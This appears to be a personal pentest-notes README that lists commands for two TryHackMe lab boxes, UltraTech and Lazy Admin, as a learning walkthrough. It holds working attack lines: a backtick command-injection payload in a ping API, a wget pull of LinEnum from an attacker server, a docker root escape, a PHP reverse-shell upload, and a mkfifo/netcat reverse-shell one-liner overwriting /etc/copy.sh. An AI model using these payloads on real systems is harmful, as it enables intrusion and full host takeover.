<h2>Purpose</h2>
</br> Shows complete list of commands at the start of the walkthrough (quick overview and command/syntax refresher)
</br> documents the notes I make in a report while pen-testing a box.
</br> These are not as clean as an "official" pentest report, but document the processing in a functional manner, so that another person would be able to comprehend the methodology and see how a goal is accomplished from the notes herein. 

<h2>Current boxes done in this manner:</h2>

</br> 1) UltraTech (tryHackMe)
- sudo nmap -sS -T4 -A -p- <ip.addr> -oN scanOutput.txt
- gobuster dir -u http://<ip.adr>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hw <wordcount-to-exclude>  http://10.10.61.189:31331/FUZZ
- vuln API in a js file found. --> [ const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}` ]
- backticks allow us to run a command with higher priority! --></br> API 
<ip.target>:<port>/ping?ip=`ls`
- show contents of a discovered sql database
http://10.10.61.189:8081/ping?ip=`cat utech.db.sqlite`
- Serve up file shuffle to get LinEnum on target --> Python -m SimpleHTTPServer 8080.
(note tha port 8080 has to be used if 80 is busy)
- Make sure LinEnum is transferred to target via wget (similar to curl)
wget http://<ip.attacker>:8080/LinEnum.sh
—> chmod +x LinEnum.sh
- docker found, so GTFO bin helps us break out --> docker run -v /:/mnt --rm -it bash chroot /mnt sh

</br> 2) Lazy Admin (tryHackMe)
- sweetrice data exposure : url variation of  [ http://localhost/inc/mysql_backup ] 
</br> webfiles at [http://localhost/SweetRice-transfer.zip]
- file upload vector in "media center" for sweetrice
- use php reverse shell and set up netcat to catch the shell https://github.com/pentestmonkey/php-reverse-shell
- sudo -l (finds) backup.pl (which calls) /etc/copy.sh (which runs a reverse shell of its own out to some ip, presumably for serving backup data)
- overwrite copy.sh file via CLI --> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.253.178 5554 >/tmp/f" > /etc/copy.sh
